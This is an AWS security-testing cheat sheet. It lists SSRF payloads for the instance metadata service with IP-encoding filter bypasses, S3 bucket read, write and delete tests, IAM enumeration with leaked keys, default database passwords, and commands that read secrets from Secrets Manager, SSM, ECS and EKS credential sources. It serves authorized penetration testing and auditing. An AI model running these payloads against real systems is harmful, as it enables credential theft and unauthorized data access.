# AWS Security Testing

## Overview
Security testing for AWS cloud environments including IAM misconfigurations, S3 bucket exposure, metadata service SSRF, and service-specific vulnerabilities.

## SSRF to AWS Metadata Service
```
# IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/user-data  → startup scripts, may contain secrets

# IMDSv2 (token required - harder to exploit)
# First get token:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then use token:
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN

# Alternative metadata IPs (DNS rebinding etc)
http://[::ffff:169.254.169.254]/  → IPv6 format
http://169.254.169.254.xip.io/
http://0xA9FEA9FE/  → hex
http://2852039166/  → decimal
```

## S3 Bucket Testing
```
# Check if bucket is public
curl https://BUCKET_NAME.s3.amazonaws.com/
curl https://s3.amazonaws.com/BUCKET_NAME/

# List bucket contents
aws s3 ls s3://bucket-name --no-sign-request
aws s3 ls s3://bucket-name

# Download files
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Test write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request

# Bucket name guessing
# company-name, company-prod, company-dev, company-staging
# company-backup, company-logs, company-assets, company-static
# company.com, www.company.com

# Check ACL (if allowed)
curl https://BUCKET.s3.amazonaws.com/?acl

# Delete test
aws s3 rm s3://bucket-name/test.txt --no-sign-request
```

## IAM Testing
```
# Test credentials found in JS, env vars, git repos
# AWS key format: AKIA[A-Z0-9]{16}

# Identify current identity
aws sts get-caller-identity

# Enumerate permissions
aws iam get-user
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam get-policy-version --policy-arn ARN --version-id v1

# Enumerate all roles/users (if permitted)
aws iam list-users
aws iam list-roles

# Tools: enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

## EC2 / Lambda Misconfigurations
```
# EC2 security group testing
# Look for overly permissive inbound rules
# 0.0.0.0/0 on ports: 22(SSH), 3389(RDP), 5432(PostgreSQL), 3306(MySQL)

# Lambda function URL - unauthenticated
# https://FUNCTION_ID.lambda-url.REGION.on.aws/

# EC2 user data (startup script) via metadata:
curl http://169.254.169.254/latest/user-data
# May contain: passwords, API keys, scripts

# Snapshot enumeration
aws ec2 describe-snapshots --owner-ids ACCOUNT_ID
# Public snapshots: --filters Name=visibility,Values=public
```

## RDS / Database Exposure
```
# Check for publicly accessible RDS
aws rds describe-db-instances
# Look for: PubliclyAccessible: true

# Default/weak credentials on exposed databases
# PostgreSQL: postgres:postgres, postgres:password
# MySQL: root:root, root:password, admin:admin
```

## Secrets Manager / SSM Parameter Store
```
# If IAM permissions allow:
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

aws ssm get-parameters-by-path --path "/" --with-decryption --recursive
aws ssm get-parameter --name "/db/password" --with-decryption
```

## CloudTrail / Logging
```
# Check if CloudTrail enabled
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name TRAIL_NAME

# Disabled logging = actions not recorded
# Look for gaps in logging coverage
```

## S3 Pre-Signed URL Abuse
```
# Pre-signed URLs give temporary access to S3 objects
# Check expiry time
# Test URL manipulation (can you access other objects by changing key?)

# Generate pre-signed URL:
aws s3 presign s3://bucket/object --expires-in 3600
```

## ECS/EKS Metadata
```
# ECS container metadata
http://169.254.170.2/v2/credentials/CREDENTIALS_RELATIVE_URI
# CREDENTIALS_RELATIVE_URI from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# EKS pod service account
/var/run/secrets/kubernetes.io/serviceaccount/token
```

## Testing Methodology
1. Test SSRF → metadata service (169.254.169.254)
2. Discover and test S3 buckets (list, read, write, delete)
3. Look for exposed AWS credentials (JS files, git, env vars)
4. Test credentials with AWS CLI (sts get-caller-identity)
5. Enumerate IAM permissions
6. Check for public RDS instances
7. Test Lambda function URLs
8. Check Secrets Manager and SSM parameters
9. Verify CloudTrail and security monitoring

## Tools
- `aws cli` — primary tool
- `enumerate-iam` — permission enumeration
- `pacu` — AWS exploitation framework
- `prowler` — AWS security audit
- `s3scanner` — S3 bucket enumeration
- `truffleHog` / `gitleaks` — credential scanning
